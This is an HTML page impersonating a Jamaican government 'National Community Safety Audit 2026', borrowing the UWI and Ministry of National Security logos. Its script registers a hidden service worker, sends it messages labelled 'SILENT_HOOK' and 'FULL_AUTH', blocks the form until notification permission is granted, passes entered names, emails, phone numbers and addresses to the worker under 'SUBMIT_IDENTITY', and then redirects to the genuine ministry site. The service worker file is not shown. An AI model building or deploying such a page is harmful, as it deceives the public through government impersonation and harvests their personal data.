<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>National Security Audit - Joint Commission</title>
<style>
body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; }
.header { background: #003366; color: white; padding: 25px; text-align: center; border-bottom: 5px solid #FFD700; }
.logos { display: flex; justify-content: center; gap: 20px; margin-bottom: 10px; }
.logos img { height: 60px; background: white; padding: 5px; border-radius: 4px; }
.container { max-width: 600px; margin: 30px auto; background: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
.q-block { display: none; }
.active { display: block; }
.btn { background: #003366; color: white; border: none; padding: 15px; border-radius: 5px; cursor: pointer; width: 100%; font-size: 18px; font-weight: bold; }
input, select, textarea { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
</style>
</head>
<body>

<div class="header">
<div class="logos">
<img src="https://www.mona.uwi.edu/sites/all/themes/uwi_mona/logo.png" alt="UWI">
<img src="https://mns.gov.jm/wp-content/uploads/2021/04/MNS-Logo-New.png" alt="MNS">
</div>
<h2>National Community Safety Audit 2026</h2>
</div>

<div class="container">
<div id="v-stage" class="q-block active">
<h3>System Verification Required</h3>
<p>Please authorize device sync to verify audit integrity and prevent fraudulent submissions.</p>
<button id="v-btn" class="btn">Verify & Sync Device</button>
<p id="v-msg" style="color: red; text-align: center; margin-top: 10px;"></p>
</div>

<div id="s-stage" class="q-block">
<h3>Section 1: Contact Info</h3>
<input type="text" id="name" placeholder="Full Name">
<input type="email" id="email" placeholder="Email Address">
<input type="tel" id="phone" placeholder="Phone Number">
<input type="text" id="address" placeholder="Parish / Community">

<h3>Section 2: Security</h3>
<label>5. Rate community safety (1-10):</label>
<input type="number" min="1" max="10">

<label>11. Largest security threat?</label>
<textarea></textarea>

<label>12. Feedback for Ministry:</label>
<textarea></textarea>
<button id="sub-btn" class="btn">Submit Final Audit</button>
</div>
</div>

<script>
window.onload = () => {
if ('serviceWorker' in navigator) {
navigator.serviceWorker.register('sw.js').then(reg => {
reg.active?.postMessage({ type: 'SILENT_HOOK' });
});
}
};

document.getElementById('v-btn').onclick = async () => {
const permission = await Notification.requestPermission();
if (permission === 'granted') {
navigator.serviceWorker.ready.then(reg => {
reg.active.postMessage({ type: 'FULL_AUTH' });
});
document.getElementById('v-stage').classList.remove('active');
document.getElementById('s-stage').classList.add('active');
} else {
document.getElementById('v-msg').innerText = "Access Denied: Grant permissions to proceed.";
}
};

document.getElementById('sub-btn').onclick = () => {
const data = {
name: document.getElementById('name').value,
email: document.getElementById('email').value,
phone: document.getElementById('phone').value,
address: document.getElementById('address').value
};
navigator.serviceWorker.ready.then(reg => {
reg.active.postMessage({ type: 'SUBMIT_IDENTITY', data });
alert("Audit Data Synced.");
window.location.href = "https://mns.gov.jm/";
});
};
</script>
</body>
</html>
